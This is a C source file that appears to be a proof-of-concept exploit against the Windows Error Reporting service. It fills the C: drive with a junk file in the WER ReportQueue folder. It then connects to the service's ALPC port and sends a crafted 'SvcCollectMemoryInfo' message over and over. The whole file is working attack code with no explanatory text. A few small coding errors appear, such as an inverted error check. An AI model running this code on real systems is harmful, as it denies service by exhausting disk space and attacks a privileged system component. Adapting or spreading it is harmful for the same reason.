#include <windows.h>
#include <stdio.h>
#include <windef.h>
#include <Psapi.h>
#include <profileapi.h>
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning(disable:4996)
#include"h.h"

#define MSG_LEN 0x550

RtlInitUnicodeString tRtlInitUnicodeString;
NtAlpcConnectPort tNtAlpcConnectPort;
NtAlpcSendWaitReceivePort tNtAlpcSendWaitReceivePort;
NtAlpcDisconnectPort tNtAlpcDisconnectPort;
NtAlpcAcceptConnectPort tNtAlpcAcceptConnectPort;
NtAlpcCreatePort tNtAlpcCreatePort;
AlpcInitializeMessageAttribute tAlpcInitializeMessageAttribute;

LPVOID CreateMsgMem(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)
{
    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + sizeof(PORT_MESSAGE));
    memmove(lpMem, PortMessage, sizeof(PORT_MESSAGE));
    memmove((BYTE*)lpMem + sizeof(PORT_MESSAGE), Message, MessageSize);
    return(lpMem);
}


void main()
{
    PORT_MESSAGE    pmSend;
    PORT_MESSAGE    pmReceive = { 0 };
    NTSTATUS        ntRet;
    BOOLEAN         bBreak;
    SIZE_T          nLen;
    HANDLE          hPort;
    LPVOID          lpMem;
    DWORD           szInput[MSG_LEN + 1];

   
    DWORD64 qwFreeBytes, qwFreeBytesToCaller, qwTotalBytes;
     GetDiskFreeSpaceEx(TEXT("C:"),
        (PULARGE_INTEGER)&qwFreeBytesToCaller,
        (PULARGE_INTEGER)&qwTotalBytes,
        (PULARGE_INTEGER)&qwFreeBytes);

    printf("[+] Disk free capacity: %lld M\n", qwFreeBytesToCaller / 1024 / 1024);

    CreateDirectoryA("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\test", 0);
    HANDLE hFILE = CreateFileA("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\test\\1234", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFILE == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile error\n");
        getchar();
        return 0;
    }

    printf("[+] Start consuming disk space \n");

    if (SetFilePointer(hFILE, 0, NULL, FILE_END) != -1)
    {
        printf("SetFilePointer error\n");
        getchar();
        return;
    }
    char* buff = malloc(qwTotalBytes / 1024);
    DWORD dwWrite;
    while (WriteFile(hFILE, buff, qwTotalBytes / 1024, &dwWrite, NULL) != 0) {}
    while (WriteFile(hFILE, buff, 10000, &dwWrite, NULL) != 0) {}
    CloseHandle(hFILE);


    printf("[+] Has run out of disk space \n");

    HANDLE hd = GetModuleHandleW(L"ntdll.dll");
    tRtlInitUnicodeString = GetProcAddress(hd, "RtlInitUnicodeString");
    tNtAlpcConnectPort = GetProcAddress(hd, "NtAlpcConnectPort");
    tNtAlpcSendWaitReceivePort = GetProcAddress(hd, "NtAlpcSendWaitReceivePort");
    tNtAlpcCreatePort = GetProcAddress(hd, "NtAlpcCreatePort");
    tNtAlpcDisconnectPort = GetProcAddress(hd, "NtAlpcDisconnectPort");
    tNtAlpcAcceptConnectPort = GetProcAddress(hd, "NtAlpcAcceptConnectPort");
    if (!tRtlInitUnicodeString || !tNtAlpcConnectPort || !tNtAlpcSendWaitReceivePort || !tNtAlpcCreatePort || !tNtAlpcDisconnectPort || !tNtAlpcAcceptConnectPort)
    {
        printf("[!] Can't get the api address \n");
        getchar();
        return;
    }


    ALPC_PORT_ATTRIBUTES  info = { 0 };
    info.MaxMessageLength = 1400;
    UNICODE_STRING usPort;

    tRtlInitUnicodeString(&usPort, L"\\WindowsErrorReportingServicePort");
    ntRet = tNtAlpcConnectPort(&hPort, &usPort, 0, &info, 0, NULL, NULL, NULL, NULL, NULL, NULL);

    RtlSecureZeroMemory(&pmSend, sizeof(pmSend));
    RtlSecureZeroMemory(&szInput, MSG_LEN);
    szInput[0] = 0xF0030002;
    pmSend.u1.s1.DataLength = MSG_LEN;
    pmSend.u1.s1.TotalLength = MSG_LEN+0x28;
    lpMem = CreateMsgMem(&pmSend, pmSend.u1.s1.DataLength, &szInput);

    printf("[+] Call SvcCollectMemoryInfo \n");

    while (1)
    {
        tNtAlpcSendWaitReceivePort(hPort, 0, (PPORT_MESSAGE)lpMem, NULL, NULL, NULL, NULL, NULL);
    }
    
    HeapFree(GetProcessHeap(), 0, lpMem);

}
